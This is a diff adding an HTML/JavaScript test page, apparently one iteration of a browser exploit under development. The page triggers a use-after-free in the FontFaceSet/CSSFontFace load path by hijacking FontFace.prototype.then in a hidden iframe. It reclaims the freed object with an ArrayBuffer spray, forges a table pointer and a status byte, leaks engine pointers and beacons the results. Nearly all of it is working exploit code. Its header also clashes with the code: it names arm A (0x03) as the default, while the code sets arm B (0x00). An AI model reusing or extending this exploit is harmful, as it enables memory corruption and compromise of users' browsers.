@@ -1,0 +1,270 @@
+<!--
+  p656m: status-byte mapper arm A — seed Status::Success (0x03) at face +0x82
+
+  cobrajet Issue #241 §5, one-byte law:
+    enum class Status : uint8_t { Pending, Loading, TimedOut, Success, Failure }
+    FontFaceSet load path skips terminal faces (Success -> immediate resolve,
+    never re-walk). Paired discriminator: resolve-immediate and no-walk must
+    flip together on ONE byte.
+
+  Why iframe: p656g bench proof — in the MAIN doc the forge requires
+  delete(this), which REMOVES the face from the set; a fresh load('1em fb')
+  then resolves vacuously without touching our buffer. The hidden-iframe
+  variant (p655/p656e pattern) prunes the orphan WITHOUT delete -> the set's
+  family lookup still holds the stale CSSFontFace* -> the engine READS the
+  status byte from OUR forged buffer.
+
+  p656k baseline: +0x82 == 0x00 on a Pending forged face (clean zero window).
+
+  Arms (edit SEED_ST between reloads):
+    A 0x03 Success  <- this file default
+    B 0x00 Pending  (control: real load attempt / walk expected)
+    C 0x04 Failure  (terminal control)
+
+  S-probe signatures:
+    - settle type + latency (sync-ish immediate vs async font-load latency)
+    - buffer diff scan (walk writes) incl. W@+0x68 cell, +0x70/+0x74 counters
+    - rc timeline before/after
+
+  Beacon: P656M-.
+  CRASH_CLASS: HIGH (iframe forge family; arm B may attempt a real load on a
+  zeroed source -> reject or crash, which is itself an oracle row).
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656m</title></head>
+<body>p656m: status byte arm A (0x03 Success @ +0x82)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656M-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+var SEED_ST = 0x00;   /* arm switch: 0x00 / 0x03 / 0x04 */
+
+emit('START', 'st=0x' + SEED_ST.toString(16) + ' armB-pending-control');
+flush();
+
+var bufs1 = [], bufs2 = [];
+var hit1 = -1, hit2 = -1;
+var T1_lo = 0, T1_hi = 0;
+
+window.spray1 = function() {
+  for (var i = 0; i < 80; i++) {
+    var ab = new ArrayBuffer(192);
+    var dv = new DataView(ab);
+    dv.setUint32(0x00, 2, true);
+    dv.setUint32(0x04, 0xAAAA0001, true);
+    bufs1.push({ dv: dv });
+  }
+};
+window.spray2 = function(tlo, thi) {
+  for (var i = 0; i < 80; i++) {
+    var ab = new ArrayBuffer(192);
+    var dv = new DataView(ab);
+    dv.setUint32(0x00, 5, true);          /* rc seed (k-timeline law: +1 at adopt) */
+    dv.setUint32(0x04, 0xBBBB0006, true);
+    dv.setUint32(0x58, tlo, true);        /* FORGE m_table = T1 */
+    dv.setUint32(0x5C, thi, true);
+    dv.setUint8(0x82, SEED_ST);           /* THE TEST BYTE */
+    bufs2.push({ dv: dv });
+  }
+};
+window.noteTrap = function(n) {
+  emit('TRAP' + n, 'b1=' + bufs1.length + ' b2=' + bufs2.length);
+  flush();
+  if (n === 1) setTimeout(analyze1, 150);
+  if (n === 2) setTimeout(analyze2, 150);
+};
+window.emitChild = function(tag, msg) { emit(tag, msg); flush(); };
+
+function analyze1() {
+  try {
+    hit1 = -1;
+    for (var i = 0; i < bufs1.length; i++) {
+      if (bufs1[i].dv.getUint32(0x58, true) !== 0 || bufs1[i].dv.getUint32(0x5C, true) !== 0) { hit1 = i; break; }
+    }
+    if (hit1 < 0) { emit('P1-MISS', 'no reclaim'); flush(); return; }
+    var dv1 = bufs1[hit1].dv;
+    T1_lo = dv1.getUint32(0x58, true);
+    T1_hi = dv1.getUint32(0x5C, true);
+    emit('P1-HIT', 'hit=' + hit1 + ' T1=' + hex32(T1_hi) + hex32(T1_lo) +
+      ' W1=' + hex32(dv1.getUint32(0x6C, true)) + hex32(dv1.getUint32(0x68, true)) +
+      ' st82=0x' + dv1.getUint8(0x82).toString(16));
+    flush();
+    if (!T1_lo && !T1_hi) { emit('P1-FAIL', 'T1 null'); flush(); return; }
+    try { ifr.contentWindow.arm2(); } catch(e) { emit('ARM2-ERR', String(e).slice(0,60)); flush(); }
+  } catch(e) { emit('P1-FATAL', String(e).slice(0,120)); flush(); }
+}
+
+function analyze2() {
+  try {
+    hit2 = -1;
+    /* engine-write scan EXCLUDING our seeds (0x00,0x04,0x58/5C,0x82) */
+    for (var i = 0; i < bufs2.length; i++) {
+      var d = bufs2[i].dv, dirty = false;
+      for (var o = 0x08; o < 0x50; o += 4) if (d.getUint32(o, true) !== 0) { dirty = true; break; }
+      if (!dirty) for (var o2 = 0x60; o2 < 0x80; o2 += 4) if (d.getUint32(o2, true) !== 0) { dirty = true; break; }
+      if (!dirty) for (var o3 = 0x84; o3 < 0xC0; o3 += 4) if (d.getUint32(o3, true) !== 0) { dirty = true; break; }
+      if (dirty) { hit2 = i; break; }
+    }
+    if (hit2 < 0) { emit('P2-MISS', 'no engine write outside seeds'); flush(); return; }
+
+    var dv2 = bufs2[hit2].dv;
+    var held = (dv2.getUint32(0x58, true) === T1_lo && dv2.getUint32(0x5C, true) === T1_hi);
+    emit('P2-HIT', 'hit=' + hit2 + ' forge=' + held +
+      ' f58=' + hex32(dv2.getUint32(0x5C, true)) + hex32(dv2.getUint32(0x58, true)) +
+      ' rc=' + dv2.getUint32(0x00, true) +
+      ' W2=' + hex32(dv2.getUint32(0x6C, true)) + hex32(dv2.getUint32(0x68, true)) +
+      ' st82-now=0x' + dv2.getUint8(0x82).toString(16));
+    flush();
+    /* NOTE: forge-held is TABLE sharing — orthogonal to the status-byte test.
+       rc=+1 and W2@+0x68 prove the buffer IS the adopted face. Proceed. */
+    if (!held) { emit('FORGE-NOHELD', 'fresh T2 at +0x58 (iframe path) — S-probe anyway'); flush(); }
+    setTimeout(sProbe, 300);
+  } catch(e) { emit('P2-FATAL', String(e).slice(0,120)); flush(); }
+}
+
+function sProbe() {
+  try {
+    var dv2 = bufs2[hit2].dv;
+    /* full snapshot for walk-diff */
+    var snap = [];
+    for (var j = 0; j < 192; j += 4) snap.push(dv2.getUint32(j, true));
+    emit('S-PRE', 'rc=' + dv2.getUint32(0x00, true) + ' st82=0x' + dv2.getUint8(0x82).toString(16));
+    flush();
+
+    var t0 = Date.now();
+    var settled = 'pending';
+    try {
+      ifr.contentWindow.armS(function(kind) {
+        settled = kind + '@' + (Date.now() - t0) + 'ms';
+        emit('S-SETTLE', settled);
+        flush();
+        afterSettle();
+      });
+      emit('S-SENT', 'load(1em fb, E) via child');
+    } catch(e) { emit('S-ERR', String(e).slice(0,60)); flush(); return; }
+    flush();
+
+    function afterSettle() {
+      setTimeout(function() {
+        var rc = dv2.getUint32(0x00, true);
+        var diffs = [];
+        for (var j2 = 0; j2 < 192; j2 += 4) {
+          var cur = dv2.getUint32(j2, true);
+          if (cur !== snap[j2 / 4]) diffs.push('+' + j2.toString(16) + ':' + hex32(snap[j2/4]) + '>' + hex32(cur));
+        }
+        emit('S-POST', 'rc=' + rc + ' st82=0x' + dv2.getUint8(0x82).toString(16) + ' diffs=' + diffs.length);
+        if (diffs.length) emit('S-DIFFS', diffs.slice(0, 12).join(' '));
+
+        /* paired verdict */
+        var immediate = /@0ms|@1[0-9]ms|@[0-9]ms/.test(settled);
+        var walked = diffs.length > 0;
+        if (settled.indexOf('resolved') === 0 && immediate && !walked)
+          emit('VERDICT', 'SUCCESS-HONORED: immediate resolve + NO walk (status byte read, terminal skip)');
+        else if (settled.indexOf('resolved') === 0 && immediate && walked)
+          emit('VERDICT', 'RESOLVED-FAST+WALK: byte seen but walk still ran (partial)');
+        else if (!immediate)
+          emit('VERDICT', 'REAL-LOAD: async settle (byte ignored on skip path)');
+        else
+          emit('VERDICT', 'OTHER: ' + settled + ' walked=' + walked);
+        emit('ALIVE', 'end');
+        flush();
+      }, 250);
+    }
+  } catch(e) { emit('S-FATAL', String(e).slice(0,120)); flush(); }
+}
+
+/* --- hidden iframe: forge + S-probe executor --- */
+var ifr = document.createElement('iframe');
+ifr.style.display = 'none';
+document.body.appendChild(ifr);
+var iDoc = ifr.contentDocument;
+iDoc.open();
+iDoc.write([
+  '<!DOCTYPE html><html><head></head><body>',
+  '<script>',
+  '(function() {',
+  '  var phase = 0;',
+  '  var sty1 = null, sty2 = null;',
+  '  sty1 = document.createElement("style");',
+  '  sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";',
+  '  document.head.appendChild(sty1);',
+  '  var ffA = new FontFace("fa", "local(Helvetica)", { unicodeRange: "U+0041" });',
+  '  document.fonts.add(ffA);',
+  '  void ffA.loaded;',
+  '  Object.defineProperty(FontFace.prototype, "then", {',
+  '    configurable: true,',
+  '    get: function() {',
+  '      if (phase === 1) {',
+  '        phase = 0;',
+  '        sty1.remove();',
+  '        document.body.offsetHeight;',
+  '        try { parent.spray1(); } catch(e) {}',
+  '        try { parent.noteTrap(1); } catch(e) {}',
+  '        return undefined;',
+  '      }',
+  '      if (phase === 2) {',
+  '        phase = 0;',
+  '        sty2.remove();',
+  '        document.body.offsetHeight;',
+  '        try { parent.spray2(window.__tlo, window.__thi); } catch(e) {}',
+  '        try { parent.noteTrap(2); } catch(e) {}',
+  '        return undefined;',
+  '      }',
+  '      return undefined;',
+  '    },',
+  '    set: function() {}',
+  '  });',
+  '  window.arm2 = function() {',
+  '    sty2 = document.createElement("style");',
+  '    sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";',
+  '    document.head.appendChild(sty2);',
+  '    var ffB = new FontFace("fb", "local(Helvetica)", { unicodeRange: "U+0044" });',
+  '    document.fonts.add(ffB);',
+  '    void ffB.loaded;',
+  '    window.__tlo = parent.window.__T1lo; window.__thi = parent.window.__T1hi;',
+  '    phase = 2;',
+  '    try { parent.emitChild("ARM2", "load sent"); } catch(e) {}',
+  '    document.fonts.load("1em fb, sb", "CD");',
+  '  };',
+  '  window.armS = function(cb) {',
+  '    try {',
+  '      document.fonts.load("1em fb", "E").then(',
+  '        function() { try { cb("resolved"); } catch(e) {} },',
+  '        function(er) { try { cb("rejected:" + String(er).slice(0,40)); } catch(e) {} }',
+  '      );',
+  '    } catch(e) { try { cb("threw:" + String(e).slice(0,40)); } catch(e2) {} }',
+  '  };',
+  '  phase = 1;',
+  '  try { parent.emitChild("ARM1", "load sent"); } catch(e) {}',
+  '  document.fonts.load("1em fa, sa", "AB");',
+  '})();',
+  '<\/script></body></html>'
+].join('\n'));
+iDoc.close();
+
+/* T1 handoff to child (poll, 30s window) */
+window.__T1lo = 0; window.__T1hi = 0;
+var _sync = setInterval(function() { window.__T1lo = T1_lo; window.__T1hi = T1_hi; }, 30);
+setTimeout(function() { clearInterval(_sync); }, 30000);
+
+emit('IFRAME', 'created');
+flush();
+
+})();
+</script>
+</body></html>
